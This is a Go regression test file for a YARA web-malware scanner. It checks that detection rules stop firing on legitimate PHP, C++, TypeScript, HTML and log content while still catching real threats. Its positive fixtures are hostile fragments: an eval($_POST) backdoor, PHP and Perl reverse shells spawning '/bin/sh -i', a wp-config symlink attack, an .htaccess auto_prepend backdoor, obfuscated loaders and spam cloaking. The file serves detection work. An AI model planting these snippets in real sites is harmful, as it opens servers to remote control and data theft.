//go:build yara

package yara

import "testing"

// Regression tests for the context/boundary/proximity arm of the 2026-07 flood.
// Each rule fired on a file that lacked the executable context of the real
// threat: a C++/TypeScript file, an HTML help page, a text log, a plugin that
// merely names attack tokens, or a doubleval() substring. The fixes add a PHP
// (or shell/perl) context, word boundaries, and proximity.

func TestFPFlood_BackdoorWpMuplugin_Doubleval(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// A real-estate theme search: doubleval($_GET[...]) contains "eval( $_GET".
	legit := []byte("<?php $v = doubleval( $_GET['min_beds'] ); if ($v >= 0) { $q[]=$v; }")
	if hasYaraRule(s.ScanBytes(legit), "backdoor_wp_muplugin") {
		t.Error("backdoor_wp_muplugin FP: doubleval() substring matched as eval")
	}
	mal := []byte("<?php eval($_POST['x']); // mu-plugin backdoor")
	if !hasYaraRule(s.ScanBytes(mal), "backdoor_wp_muplugin") {
		t.Error("backdoor_wp_muplugin regression: real eval($_POST) not detected")
	}
}

func TestFPFlood_PhpGoto_CppSource(t *testing.T) {
	s := loadRepoYaraScanner(t)
	var cpp []byte
	cpp = append(cpp, []byte("#include <json.h>\nvoid p(){\n")...)
	for i := 0; i < 12; i++ {
		cpp = append(cpp, []byte("  if(x)goto a1b2c3; a1b2c3: y();\n")...)
	}
	cpp = append(cpp, []byte("}\n")...)
	if hasYaraRule(s.ScanBytes(cpp), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation FP: matched C++ source with goto labels")
	}
	var php []byte
	php = append(php, []byte("<?php ")...)
	for i := 0; i < 10; i++ {
		php = append(php, []byte("goto x7Fa2b; x7Fa2b: ")...)
	}
	php = append(php, []byte("eval($_POST['x']);")...)
	if !hasYaraRule(s.ScanBytes(php), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation regression: real PHP goto obfuscation not detected")
	}
}

func TestFPFlood_PhpGoto_RequiresRealPhpOpenTag(t *testing.T) {
	s := loadRepoYaraScanner(t)
	var cpp []byte
	cpp = append(cpp, []byte("const char *suite = \"<?phpunit\";\n")...)
	for i := 0; i < 10; i++ {
		cpp = append(cpp, []byte("goto x7Fa2b; x7Fa2b: ")...)
	}
	if hasYaraRule(s.ScanBytes(cpp), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation FP: accepted <?phpunit as a PHP open tag")
	}

	var php []byte
	php = append(php, []byte("<? ")...)
	for i := 0; i < 10; i++ {
		php = append(php, []byte("goto x7Fa2b; x7Fa2b: ")...)
	}
	if !hasYaraRule(s.ScanBytes(php), "php_goto_obfuscation") {
		t.Error("php_goto_obfuscation regression: short PHP open tag was not accepted")
	}
}

func TestFPFlood_ExploitSymlink_TypeScriptDefs(t *testing.T) {
	s := loadRepoYaraScanner(t)
	ts := []byte("/** See symlink(2). */\nexport function symlink(target: string, path: string): void;\n// example: symlink('/home/x','./y')")
	if hasYaraRule(s.ScanBytes(ts), "exploit_symlink_bypass") {
		t.Error("exploit_symlink_bypass FP: matched TypeScript fs type definitions")
	}
	mal := []byte("<?php symlink('/home/victim/public_html/wp-config.php', '/home/attacker/public_html/x.txt');")
	if !hasYaraRule(s.ScanBytes(mal), "exploit_symlink_bypass") {
		t.Error("exploit_symlink_bypass regression: real PHP symlink attack not detected")
	}
}

func TestFPFlood_RevshellPentestmonkey_MailchimpClient(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte("<?php class MCAPI { function callServer(){ $sock = fsockopen($this->host, 80); fwrite($sock, $payload); } }")
	if hasYaraRule(s.ScanBytes(legit), "revshell_pentestmonkey") {
		t.Error("revshell_pentestmonkey FP: matched a MailChimp API HTTP client")
	}
	mal := []byte("<?php $sock=fsockopen($ip,$port); $proc=proc_open('/bin/sh -i', $descriptorspec, $pipes);")
	if !hasYaraRule(s.ScanBytes(mal), "revshell_pentestmonkey") {
		t.Error("revshell_pentestmonkey regression: real reverse shell not detected")
	}
}

func TestFPFlood_RevshellPerl_PhpFlickrLib(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// A PHP library: exec( is the tail of curl_exec(, connect( of mysqli_connect(.
	legit := []byte("<?php class phpFlickr { function call(){ $r = curl_exec($ch); mysqli_connect($h); } } // use SocketIO")
	if hasYaraRule(s.ScanBytes(legit), "revshell_perl") {
		t.Error("revshell_perl FP: matched a PHP library via curl_exec/connect substrings")
	}
	mal := []byte("#!/usr/bin/perl\nuse Socket;\nconnect(SOCK,$paddr);\nexec('/bin/sh -i');")
	if !hasYaraRule(s.ScanBytes(mal), "revshell_perl") {
		t.Error("revshell_perl regression: real Perl reverse shell not detected")
	}
}

func TestFPFlood_RevshellPerl_RequiresShebangAtFileStart(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte("<?php $example = '#!/usr/bin/perl'; // use SocketIO; mysqli_connect($h); curl_exec($ch);")
	if hasYaraRule(s.ScanBytes(legit), "revshell_perl") {
		t.Error("revshell_perl FP: accepted embedded shebang text in a PHP library")
	}
}

func TestFPFlood_SpamPharma_ThemeDemoXml(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// woodmart demo import: cialis in one content item, display:none CSS in a
	// widget elsewhere, "order now" in a third - all far apart.
	var xml []byte
	xml = append(xml, []byte("<item><content>Buy cialis reviews here.</content></item>")...)
	xml = append(xml, make([]byte, 1200)...)
	xml = append(xml, []byte("<item><style>.widget{display:none}</style></item>")...)
	xml = append(xml, make([]byte, 1200)...)
	xml = append(xml, []byte("<item><button>order now</button></item>")...)
	if hasYaraRule(s.ScanBytes(xml), "spam_pharma") {
		t.Error("spam_pharma FP: matched scattered tokens in a theme demo import")
	}
	mal := []byte("<div style=\"display:none\">Buy cheap viagra online, order now cialis discount pharmacy</div>")
	if !hasYaraRule(s.ScanBytes(mal), "spam_pharma") {
		t.Error("spam_pharma regression: real hidden pharma block not detected")
	}
}

func TestFPFlood_SpamPharma_RequiresOneCluster(t *testing.T) {
	s := loadRepoYaraScanner(t)
	var scattered []byte
	scattered = append(scattered, []byte("<div style=\"display:none\"></div>")...)
	scattered = append(scattered, make([]byte, 600)...)
	scattered = append(scattered, []byte("cialis")...)
	scattered = append(scattered, make([]byte, 600)...)
	scattered = append(scattered, []byte("order now")...)
	if hasYaraRule(s.ScanBytes(scattered), "spam_pharma") {
		t.Error("spam_pharma FP: matched signals spanning more than one cluster")
	}

	var pairs []byte
	pairs = append(pairs, []byte("cialis order now")...)
	pairs = append(pairs, make([]byte, 900)...)
	pairs = append(pairs, []byte("cialis display:none")...)
	pairs = append(pairs, make([]byte, 900)...)
	pairs = append(pairs, []byte("order now display:none")...)
	if hasYaraRule(s.ScanBytes(pairs), "spam_pharma") {
		t.Error("spam_pharma FP: combined signals from three disconnected pairs")
	}
}

func TestFPFlood_SpamWpFooter_ThemeOptionAndMapLink(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// Salient footer.php: wp_footer + add_action + a "dofollow" theme option.
	salient := []byte("<?php add_action('wp_footer', function(){ $opts=['link_rel'=>'dofollow','nofollow'=>false]; render($opts); });")
	if hasYaraRule(s.ScanBytes(salient), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection FP: matched a theme dofollow option label")
	}
	mal := []byte("<?php add_action('wp_footer', function(){ echo '<div style=\"display:none\"><a href=\"https://spam.example/loans\" rel=\"dofollow\">payday</a></div>'; });")
	if !hasYaraRule(s.ScanBytes(mal), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection regression: real hidden footer link injector not detected")
	}
}

func TestFPFlood_SpamWpFooter_DoesNotBridgeEchoStatements(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
add_action('wp_footer', function() {
	echo '<div class="settings" style="display:none">preferences</div>';
	render_footer_widgets();
	echo '<a href="https://docs.example/help">Help</a>';
});`)
	if hasYaraRule(s.ScanBytes(legit), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection FP: bridged unrelated echo statements")
	}

	reversed := []byte(`<?php
add_action('wp_footer', function() {
	echo '<a href="https://docs.example/help">Help</a>';
	render_footer_widgets();
	echo '<div class="settings" style="visibility:hidden">preferences</div>';
});`)
	if hasYaraRule(s.ScanBytes(reversed), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection FP: bridged reverse-order echo statements")
	}

	malicious := []byte(`<?php add_action("wp_footer", function() { echo "<a href='https://spam.example/'>loan</a><span style='visibility:hidden'>x</span>"; });`)
	if !hasYaraRule(s.ScanBytes(malicious), "spam_wp_footer_injection") {
		t.Error("spam_wp_footer_injection regression: reverse-order hidden link was not detected")
	}
}

func TestFPFlood_SpamCloakingReferer_SecurityRuleset(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// hide-my-wp firewall rules and an nginx config generator reference
	// HTTP_REFERER and google as data, not to serve cloaked content.
	legit := []byte("<?php $patterns = array('if.*HTTP_REFERER.*google' => 'block'); $conf .= \"if (\\$http_referer ~* google) { return 403; }\";")
	if hasYaraRule(s.ScanBytes(legit), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer FP: matched a security ruleset / config generator")
	}
	mal := []byte("<?php if (strpos($_SERVER['HTTP_REFERER'],'google') !== false) { echo file_get_contents('spam.html'); }")
	if !hasYaraRule(s.ScanBytes(mal), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer regression: real referer cloaker not detected")
	}
}

func TestFPFlood_SpamCloakingReferer_RequiresGatedOutput(t *testing.T) {
	s := loadRepoYaraScanner(t)
	ungated := []byte("<?php $fromGoogle = strpos($_SERVER['HTTP_REFERER'], 'google') !== false; audit($fromGoogle); echo $normalPage;")
	if hasYaraRule(s.ScanBytes(ungated), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer FP: matched output not gated by the referer check")
	}

	redirect := []byte("<?php if (stripos($_SERVER['HTTP_REFERER'], 'bing') !== false) { wp_redirect('https://spam.example/'); }")
	if !hasYaraRule(s.ScanBytes(redirect), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer regression: gated wp_redirect was not detected")
	}
}

func TestFPFlood_BackdoorHtaccessAutoPrepend_HelpHtml(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// A Drupal views help HTML page documenting the directive in prose.
	html := []byte("<!DOCTYPE html>\n<html><body><h2>UI crashes</h2><pre>\nauto_prepend_file = c:\\wamp\\www\\php.ini.prepend\n</pre></body></html>")
	if hasYaraRule(s.ScanBytes(html), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend FP: matched an HTML help document")
	}
	mal := []byte("php_value auto_prepend_file /tmp/.shell.php\n")
	if !hasYaraRule(s.ScanBytes(mal), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend regression: real .htaccess injection not detected")
	}
}

func TestFPFlood_BackdoorHtaccessAutoPrepend_DirectiveBoundary(t *testing.T) {
	s := loadRepoYaraScanner(t)
	adminJS := []byte("auto_prepend_file_action = function () { return true; };\n")
	if hasYaraRule(s.ScanBytes(adminJS), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend FP: matched a directive-name prefix")
	}

	fragment := []byte("<h2>UI crashes</h2><pre>\nauto_prepend_file = c:\\wamp\\www\\prepend.php\n</pre>")
	if hasYaraRule(s.ScanBytes(fragment), "backdoor_htaccess_auto_prepend") {
		t.Error("backdoor_htaccess_auto_prepend FP: matched an HTML help fragment")
	}
}

func TestFPFlood_BackdoorHtaccessAutoPrepend_HtmlTokenCannotHideDirective(t *testing.T) {
	s := loadRepoYaraScanner(t)
	for _, suffix := range []string{"# <span>help</span>\n", "# <?php example\n"} {
		body := []byte("php_value auto_prepend_file /tmp/.shell.php\n" + suffix)
		if !hasYaraRule(s.ScanBytes(body), "backdoor_htaccess_auto_prepend") {
			t.Errorf("backdoor_htaccess_auto_prepend bypass: trailing documentation token %q hid a directive", suffix)
		}
	}
}

func TestFPFlood_ExploitWpCoreModification_ErrorLog(t *testing.T) {
	s := loadRepoYaraScanner(t)
	log := []byte("[21-Jul-2026] PHP Warning: file_put_contents(/home/x/wp-includes/version.php): failed to open stream in backup.php")
	if hasYaraRule(s.ScanBytes(log), "exploit_wp_core_modification") {
		t.Error("exploit_wp_core_modification FP: matched a PHP error_log line")
	}
	mal := []byte("<?php file_put_contents(ABSPATH.'wp-includes/pomo/db.php', $payload);")
	if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_core_modification") {
		t.Error("exploit_wp_core_modification regression: real core modification not detected")
	}
}

func TestFPFlood_ObfuscationFakeIoncube_ComposerPhar(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// composer.phar: "ionCube" in a platform check, eval( and base64_decode(
	// scattered kilobytes apart across the bundled tool.
	var phar []byte
	phar = append(phar, []byte("if (extension_loaded('ionCube Loader')) { return; }")...)
	phar = append(phar, make([]byte, 3000)...)
	phar = append(phar, []byte("function e($x){ return eval($x); }")...)
	phar = append(phar, make([]byte, 3000)...)
	phar = append(phar, []byte("$d = base64_decode($s);")...)
	if hasYaraRule(s.ScanBytes(phar), "obfuscation_fake_ioncube") {
		t.Error("obfuscation_fake_ioncube FP: matched composer.phar with scattered tokens")
	}
	mal := []byte("<?php /* ionCube encoded */ eval(base64_decode('ZXZpbA==')); // fake loader")
	if !hasYaraRule(s.ScanBytes(mal), "obfuscation_fake_ioncube") {
		t.Error("obfuscation_fake_ioncube regression: real fake-ionCube loader not detected")
	}
}

func TestFPFlood_ObfuscationFakeIoncube_ReverseOrder(t *testing.T) {
	s := loadRepoYaraScanner(t)
	far := append([]byte("ionCube"), make([]byte, 900)...)
	far = append(far, []byte("eval(base64_decode('ZXZpbA=='))")...)
	if hasYaraRule(s.ScanBytes(far), "obfuscation_fake_ioncube") {
		t.Error("obfuscation_fake_ioncube FP: matched decode call outside the proximity window")
	}

	mal := []byte("<?php assert(base64_decode('ZXZpbA==')); /* fake loader claims ionCube encoding */")
	if !hasYaraRule(s.ScanBytes(mal), "obfuscation_fake_ioncube") {
		t.Error("obfuscation_fake_ioncube regression: reverse-order marker was not detected")
	}
}
